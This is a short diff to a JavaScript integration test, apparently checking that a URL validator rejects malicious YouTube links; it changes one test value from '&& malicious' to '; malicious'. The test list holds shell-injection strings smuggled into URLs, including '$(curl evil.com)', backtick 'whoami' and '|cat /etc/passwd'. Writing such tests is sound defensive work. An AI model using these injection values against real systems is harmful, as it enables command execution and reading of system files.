@@ -463,7 +463,7 @@ describe("Integration Tests", () => {
                 "https://www.youtube.com/watch?v=test$(curl evil.com)",
                 "https://www.youtube.com/watch?v=test`whoami`",
                 "https://www.youtube.com/watch?v=test|cat /etc/passwd",
-                "https://www.youtube.com/watch?v=test&& malicious",
+                "https://www.youtube.com/watch?v=test; malicious",
             ];
 
             for (const url of maliciousURLs) {
